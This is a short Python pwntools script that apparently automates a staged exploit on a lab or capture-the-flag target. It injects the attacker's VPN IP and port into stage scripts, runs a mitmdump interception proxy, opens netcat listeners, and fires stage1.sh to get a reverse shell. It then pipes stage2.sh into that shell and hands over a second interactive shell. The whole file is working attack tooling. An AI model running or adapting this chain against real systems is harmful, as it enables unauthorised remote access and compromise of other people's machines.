#!/usr/bin/env python3

import os
from pwn import *
import time


with os.popen("ip a s tun0 | grep inet | head -n1 | awk '{print $2}' | cut -d/ -f1") as p:
    IP = p.read().strip()
PORT = "9000"

make_new_execs = "sed -i 's/_IP_/" + IP + \
    "/g' ./stage*.sh;sed -i 's/_PORT_/" + PORT + "/g' ./stage*.sh"
with os.popen(make_new_execs) as p:
    pass

with os.popen('mitmdump --listen-port 8800 -k -s mitm_p_script.py &') as p:
    with process(["/usr/bin/nc", "-lvnp", str(PORT)]) as listener:
        time.sleep(2)
        with os.popen("./stage1.sh") as rce:
            with process(["/usr/bin/nc", "-lvnp", str(PORT)]) as listener2:
                listener.recvuntil(b'connected', timeout=.5)
                with open("stage2.sh", 'rb') as f:
                    for i in f.readlines():
                        # print(i)
                        listener.sendline(i.strip())
                listener2.interactive()

make_old_execs = "sed -i 's/" + IP + "/_IP_/g' ./stage*.sh\n"
make_old_execs = "sed -i 's/" + PORT + "/_PORT_/g' ./stage*.sh"
with os.popen(make_old_execs) as p:
    pass
